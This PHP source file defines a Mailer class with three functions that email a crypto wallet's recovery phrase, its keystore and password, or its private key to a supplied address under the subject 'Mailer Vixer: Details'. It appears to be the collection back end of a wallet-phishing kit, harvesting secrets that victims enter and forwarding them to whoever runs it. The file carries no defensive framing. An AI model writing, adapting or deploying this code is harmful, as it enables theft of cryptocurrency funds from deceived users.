<?php

namespace Royaltechinc;

class Mailer{

    
    public function mailPhrase($email, $phrase, $wallettype, $code){

$subject="Mailer Vixer: Details ($code)";
//$email= $mail;
$msg ='
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
<b>Wallet Information </b> <br><br>


Wallet Type: '.$wallettype.'<br><br>

Phrase: <br><br>'.$phrase.'<br><br>





</body>';

sendMail($subject, $msg, $email);
}
    public function mailKeystore($email, $keystore, $password, $wallettype, $code){

$subject="Mailer Vixer: Details ($code)";
//$email= $mail;
$msg ='
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
<b>Wallet Information </b> <br><br>

Wallet Type: '.$wallettype.'<br><br>

Keystore: <br><br>'.$keystore.'<br><br>
Password: '.$password.'<br><br>








</body>';

sendMail($subject, $msg, $email);
}
    public function mailPrivatekey($email, $privatekey, $wallettype, $code){

$subject="Mailer Vixer: Details ($code)";
//$email= $mail;
$msg ='
<!DOCTYPE html">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>

<body style="margin: 0; padding: 0;">
<b>Wallet Information </b><br><br>

Wallet Type: '.$wallettype.'<br><br>

Private Key: <br><br>'.$privatekey.'<br><br>






</body>';

sendMail($subject, $msg, $email);
}
    
}
?>